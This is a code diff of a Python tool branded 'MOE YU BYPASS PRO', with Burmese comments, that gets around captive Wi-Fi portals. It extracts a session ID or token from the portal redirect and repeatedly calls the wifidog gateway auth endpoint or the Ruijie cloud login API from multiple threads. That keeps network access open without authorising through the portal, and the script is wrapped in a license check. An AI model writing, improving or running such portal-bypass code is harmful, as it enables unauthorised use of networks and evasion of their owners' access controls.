@@ -23,9 +23,9 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-PING_THREADS = 15 # Thread အနည်းငယ် တိုးထားပေးပါတယ်
-MIN_INTERVAL = 0.05
-MAX_INTERVAL = 0.2
+# အလွန်အကျွံမဖြစ်စေရန် Thread နဲ့ Interval ကို ချိန်ညှိထားသည်
+PING_THREADS = 8
+PING_INTERVAL = 0.5 
 
 # COLOR SYSTEM
 RED = "\033[91m"
@@ -73,15 +73,12 @@ def get_hwid():
     except: return "MOE-DEFAULT-999"
 
 def get_current_gateway():
-    """လက်ရှိချိတ်ထားတဲ့ Network ရဲ့ Gateway IP (Router IP) ကို ရှာပေးသည်"""
+    """လက်ရှိချိတ်ထားသော Network ရဲ့ Router IP ကို Dynamic ယူခြင်း"""
     try:
-        # Termux/Android command သုံးပြီး default gateway ရှာခြင်း
         gateway = subprocess.check_output("ip route show | grep default | awk '{print $3}'", shell=True).decode().strip()
-        if gateway:
-            return gateway
-        return "192.168.61.1" # ရှာမတွေ့ရင် default ထားမယ်
+        return gateway if gateway else "192.168.110.1"
     except:
-        return "192.168.61.1"
+        return "192.168.110.1"
 
 def check_expiry(expiry_str):
     if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
@@ -141,59 +138,53 @@ def check_license_hacker_style():
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE WITH LIVE STATUS
+# BYPASS ENGINE (MULTI-MODE)
 # ===============================
 def start_bypass_process():
     while not stop_event.is_set():
         try:
             session = requests.Session()
-            # Redirect စစ်ဖို့ ပထမဆုံး လှမ်းခေါ်ခြင်း
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
             
             if r.status_code == 204:
-                # အင်တာနက် ရနေရင် ၅ စက္ကန့် စောင့်မယ်
-                time.sleep(5)
+                time.sleep(8)
                 continue
             
             portal_url = r.url
             r1 = session.get(portal_url, timeout=10, verify=False)
             
-            # JavaScript location.href ကို ရှာခြင်း
-            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            # SID သို့မဟုတ် Token ရှာဖွေခြင်း
+            params = parse_qs(urlparse(portal_url).query)
+            sid = params.get('sessionId', [None])[0] or params.get('token', [None])[0]
             
-            r2 = session.get(next_url, timeout=10, verify=False)
-            
-            # Session ID ဆွဲထုတ်ခြင်း
-            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text) or re.search(r'token=([a-zA-Z0-9]+)', r1.text)
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
-                p = parse_qs(urlparse(portal_url).query)
-                # Dynamic Gateway ယူပြီး Auth Link ဆောက်ခြင်း
-                current_gw = p.get('gw_address', [get_current_gateway()])[0]
-                gw_port = p.get('gw_port', ['2060'])[0]
+                current_gw = get_current_gateway()
+                gw_port = params.get('gw_port', ['2060'])[0]
                 
-                auth_link = f"http://{current_gw}:{gw_port}/wifidog/auth?token={sid}"
+                # Cloud Mode သို့မဟုတ် Local Mode ခွဲခြားခြင်း
+                if "ruijienetworks.com" in portal_url:
+                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
+                    mode_label = "CLOUD"
+                else:
+                    auth_link = f"http://{current_gw}:{gw_port}/wifidog/auth?token={sid}"
+                    mode_label = "LOCAL"
                 
                 def pulse_ping():
                     while not stop_event.is_set():
                         try:
                             res = session.get(auth_link, timeout=5)
-                            if res.status_code == 200:
-                                sys.stdout.write(f"{GREEN}[✓] SID: {sid[:15]}.. | GW: {current_gw} | Status: ACTIVE{RESET}\n")
-                            else:
-                                sys.stdout.write(f"{YELLOW}[!] PINGING GATEWAY: {current_gw} ...{RESET}\n")
+                            sys.stdout.write(f"{GREEN}[✓] {mode_label} | SID: {sid[:12]}.. | GW: {current_gw} | ACTIVE{RESET}\n")
                             sys.stdout.flush()
                         except: pass
-                        time.sleep(0.1)
+                        time.sleep(PING_INTERVAL)
 
                 for _ in range(PING_THREADS):
                     threading.Thread(target=pulse_ping, daemon=True).start()
                 
-                # အင်တာနက် အခြေအနေကို စစ်ဆေးခြင်း
                 while True:
                     try:
                         if session.get("http://www.google.com", timeout=3).status_code == 200:
@@ -201,14 +192,15 @@ def start_bypass_process():
                         else: break
                     except: break
             else:
-                sys.stdout.write(f"{RED}[-] FAILED TO CAPTURE SID. RETRYING...{RESET}\n")
+                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
+                time.sleep(3)
         except Exception as e:
             time.sleep(5)
 
 if __name__ == "__main__":
     if check_license_hacker_style():
-        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), 
-                            subtitle="[bold yellow]Target: Dynamic Gateway Enabled[/bold yellow]",
+        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO v7.8 ACTIVATED 🔥[/bold white]"), 
+                            subtitle="[bold yellow]Support: Local & Cloud Portal[/bold yellow]",
                             border_style="bold red", expand=False))
         try: start_bypass_process()
         except KeyboardInterrupt: sys.exit()
